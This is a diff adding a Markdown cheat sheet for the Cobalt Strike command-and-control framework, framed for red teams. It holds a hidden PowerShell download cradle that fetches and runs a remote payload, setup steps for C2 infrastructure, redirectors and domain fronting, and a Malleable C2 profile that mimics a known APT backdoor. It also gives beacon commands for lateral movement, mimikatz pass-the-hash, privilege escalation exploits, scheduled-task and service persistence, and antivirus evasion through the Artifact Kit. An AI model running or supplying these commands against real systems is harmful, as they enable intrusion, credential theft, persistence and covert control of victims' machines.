@@ -1,0 +1,411 @@
+# Cobalt Strike
+
+> Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.
+
+
+```powershell
+$ sudo apt-get update
+$ sudo apt-get install openjdk-11-jdk
+$ sudo apt install proxychains socat
+$ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
+$ sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
+$ ./cobaltstrike
+$ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))" 
+```
+
+## Summary
+
+* [Infrastructure](#infrastructure)
+    * [Redirectors](#redirectors)
+    * [Domain fronting](#domain-fronting)
+    * [OpSec](#opsec)
+* [Payloads](#payloads)
+    * [DNS Beacon](#dns-beacon)
+    * [SMB Beacon](#smb-beacon)
+    * [Metasploit compatibility](#metasploit-compatibility)
+    * [Custom Payloads](#custom-payloads)
+* [Malleable C2](#malleable-c2)
+* [Files](#files)
+* [Powershell .NET](#powershell-net)
+* [Lateral Movement](#lateral-movement)
+* [VPN & Pivots](#vpn--pivots)
+* [Kits](#kits)
+    * [Elevate Kit](#elevate-kit)
+    * [Persistence Kit](#persistence-kit)
+    * [Resource Kit](#resource-kit)
+    * [Artifact Kit](#artifact-kit)
+* [References](#references)
+
+
+## Infrastructure
+
+### Redirectors
+
+```powershell
+sudo apt install socat
+socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80
+```
+
+### Domain Fronting
+
+* New Listener > HTTP Host Header
+* Target Finance & Healthcare domains 
+
+### OpSec
+
+**Don't**
+* Change default self-signed HTTPS certificate
+* Change default port (50050)
+* 0.0.0.0 DNS response
+* Metasploit compatibility, ask for a payload : `wget -U "Internet Explorer" http://127.0.0.1/vl6D`
+
+**Do**
+* Use a redirector (Apache, CDN, ...)
+* Firewall to only accept HTTP/S from the redirectors
+* Firewall 50050 and access via SSH tunnel
+* Edit default HTTP 404 page and Content type: text/plain
+* No staging `set hosts_stage` to `false` in Malleable C2
+
+
+## Payload
+
+### DNS Beacon
+
+* Edit the Zone File for the domain
+* Create an A record for Cobalt Strike system
+* Create an NS record that points to FQDN of your Cobalt Strike system
+
+Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server's A record.
+
+* nslookup jibberish.beacon polling.campaigns.domain.com
+* nslookup jibberish.beacon campaigns.domain.com
+
+Example of DNS on Digital Ocean:
+
+```powershell
+NS  example.com                     directs to 10.10.10.10.            86400
+NS  polling.campaigns.example.com   directs to campaigns.example.com.	3600
+A	campaigns.example.com           directs to 10.10.10.10	            3600 
+```
+
+```powershell
+systemctl disable systemd-resolved
+systemctl stop systemd-resolved
+rm /etc/resolv.conf
+echo "nameserver 8.8.8.8" >  /etc/resolv.conf
+echo "nameserver 8.8.4.4" >>  /etc/resolv.conf
+```
+
+Configuration:
+1. **host**: campaigns.domain.com
+2. **beacon**: polling.campaigns.domain.com
+3. Interact with a beacon, and `sleep 0`
+
+
+### SMB Beacon
+
+Uses Named Pipes.    
+Connect to an SMB Beacon : `link [host] [pipe]`
+
+### Metasploit compatibility
+
+* Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https
+* Set LHOST and LPORT to the beacon
+* Set DisablePayloadHandler to True
+* Set PrependMigrate to True
+* exploit -j
+
+### Custom Payloads
+
+https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c
+
+```powershell
+* Attacks > Packages > Payload Generator 
+* Attacks > Packages > Scripted Web Delivery (S)
+$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
+$ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
+$ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
+```
+
+## Malleable C2
+
+* Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles
+* Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2
+* Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles
+
+```powershell
+set useragent "SOME AGENT"; # GOOD
+set useragent 'SOME AGENT'; # BAD
+prepend "This is an example;";
+
+# Escape Double quotes
+append "here is \"some\" stuff";
+# Escape Backslashes
+append "more \\ stuff";
+# Some special characters do not need escaping
+prepend "!@#$%^&*()";
+```
+
+Check a profile with `./c2lint`.
+
+```powershell
+#
+# Etumbot Profile
+#   http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/
+#
+# Author: @harmj0y
+#
+set sample_name "Etumbot";
+set sleeptime "5000";
+set jitter    "0";
+set maxdns    "255";
+set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";
+
+http-get {
+    set uri "/image/";
+    client {
+        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8";
+        header "Referer" "http://www.google.com";
+        header "Pragma" "no-cache";
+        header "Cache-Control" "no-cache";
+        metadata {
+            netbios;
+            append "-.jpg";
+            uri-append;
+        }
+    }
+
+    server {
+        header "Content-Type" "img/jpg";
+        header "Server" "Microsoft-IIS/6.0";
+        header "X-Powered-By" "ASP.NET";
+        output {
+            base64;
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/history/";
+    client {
+        header "Content-Type" "application/octet-stream";
+        header "Referer" "http://www.google.com";
+        header "Pragma" "no-cache";
+        header "Cache-Control" "no-cache";
+        id {
+            netbiosu;
+            append ".asp";
+            uri-append;
+        }
+        output {
+            base64;
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "img/jpg";
+        header "Server" "Microsoft-IIS/6.0";
+        header "X-Powered-By" "ASP.NET";
+        output {
+            base64;
+            print;
+        }
+    }
+}
+```
+
+
+## Files
+
+```powershell
+# List the file on the specified directory
+beacon > ls <C:\Path>
+
+# Change into the specified working directory
+beacon > cd [directory]
+
+# Delete a file\folder
+beacon > rm [file\folder]
+
+# File copy
+beacon > cp [src] [dest]
+
+# Download a file from the path on the Beacon host
+beacon > download [C:\filePath]
+
+# Lists downloads in progress
+beacon > downloads
+
+# Cancel a download currently in progress
+beacon > cancel [*file*]
+
+# Upload a file from the attacker to the current Beacon host
+beacon > upload [/path/to/file]
+```
+
+## Powershell .NET
+
+```powershell
+# Import a Powershell .ps1 script from the control server and save it in memory in Beacon
+beacon > powershell-import [/path/to/script.ps1]
+
+# Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.
+beacon > powershell [commandlet][arguments]
+
+# Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto
+beacon > powerpick [commandlet] [argument]
+
+# Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs
+beacon > psinject [pid][arch] [commandlet] [arguments]
+
+# Run a local .NET executable as a Beacon post-exploitation job
+beacon > execute-assembly [/path/to/script.exe] [arguments]
+beacon > execute-assembly /home/audit/Rubeus.exe
+[*] Tasked beacon to run .NET program: Rubeus.exe
+[+] host called home, sent: 318507 bytes
+[+] received output:
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.4.2 
+```
+
+## Lateral Movement
+
+:warning: All the commands launch powershell.exe
+
+```powershell
+Beacon Remote Exploits
+======================
+jump [module] [target] [listener] 
+
+    psexec	x86	Use a service to run a Service EXE artifact
+    psexec64	x64	Use a service to run a Service EXE artifact
+    psexec_psh	x86	Use a service to run a PowerShell one-liner
+    winrm	x86	Run a PowerShell script via WinRM
+    winrm64	x64	Run a PowerShell script via WinRM
+
+Beacon Remote Execute Methods
+=============================
+remote-exec [module] [target] [command] 
+
+    Methods                         Description
+    -------                         -----------
+    psexec                          Remote execute via Service Control Manager
+    winrm                           Remote execute via WinRM (PowerShell)
+    wmi                             Remote execute via WMI (PowerShell)
+
+```
+
+Opsec safe Pass-the-Hash:
+1. `mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"`
+2. `steal_token PID`
+
+### Assume Control of Artifact
+
+* Use `link` to connect to SMB Beacon
+* Use `connect` to connect to TCP Beacon
+
+
+## VPN & Pivots
+
+:warning: Covert VPN doesn't work with W10, and requires Administrator access to deploy.
+
+> Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon's sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second.
+
+```powershell
+# Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.
+beacon > socks [PORT]
+
+# Proxy browser traffic through a specified Internet Explorer process.
+beacon > browserpivot [pid] [x86|x64]
+
+# Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.
+beacon > rportfwd [bind port] [forward host] [forward port]
+```
+
+## Kits
+
+### Elevate Kit
+
+UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)
+
+```powershell
+beacon> runasadmin
+
+Beacon Command Elevators
+========================
+
+    Exploit                         Description
+    -------                         -----------
+    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
+    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
+    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
+    svc-exe                         Get SYSTEM via an executable run as a service
+    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
+    uac-token-duplication           Bypass UAC with Token Duplication
+```
+
+### Persistence Kit
+
+* https://github.com/0xthirteen/MoveKit
+* https://github.com/fireeye/SharPersist
+    ```powershell
+    # List persistences
+    SharPersist -t schtaskbackdoor -m list
+    SharPersist -t startupfolder -m list
+    SharPersist -t schtask -m list
+
+    # Add a persistence
+    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
+    SharPersist -t schtaskbackdoor -n "Something Cool" -m remove
+
+    SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
+    SharPersist -t service -n "Some Service" -m remove
+
+    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
+    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
+    SharPersist -t schtask -n "Some Task" -m remove
+    ```
+
+### Resource Kit
+
+> The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows
+
+### Artifact Kit
+
+> Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script Manager, and load the artifact.cna script from that technique's folder.
+
+Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
+
+- `sudo apt-get install mingw-w64`
+- Edit the Artifact code
+    * Change pipename strings
+    * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
+    * Change Import
+- Build the Artifact
+- Cobalt Strike -> Script Manager > Load .cna
+
+## References
+
+* [Red Team Ops with Cobalt Strike (1 of 9): Operations](https://www.youtube.com/watch?v=q7VQeK533zI)
+* [Red Team Ops with Cobalt Strike (2 of 9): Infrastructure](https://www.youtube.com/watch?v=5gwEMocFkc0)
+* [Red Team Ops with Cobalt Strike (3 of 9): C2](https://www.youtube.com/watch?v=Z8n9bIPAIao)
+* [Red Team Ops with Cobalt Strike (4 of 9): Weaponization](https://www.youtube.com/watch?v=H0_CKdwbMRk)
+* [Red Team Ops with Cobalt Strike (5 of 9): Initial Access](https://www.youtube.com/watch?v=bYt85zm4YT8)
+* [Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation](https://www.youtube.com/watch?v=Pb6yvcB2aYw)
+* [Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation](https://www.youtube.com/watch?v=lzwwVwmG0io)
+* [Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement](https://www.youtube.com/watch?v=QF_6zFLmLn0)
+* [Red Team Ops with Cobalt Strike (9 of 9): Pivoting](https://www.youtube.com/watch?v=sP1HgUu7duU&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no&index=10&t=0s)
+* [A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 ](https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b)
+* [Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019](https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers/)
+* [TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018](https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/)
+* [Cobalt Strike - DNS Beacon](https://www.cobaltstrike.com/help-dns-beacon)
+* [How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
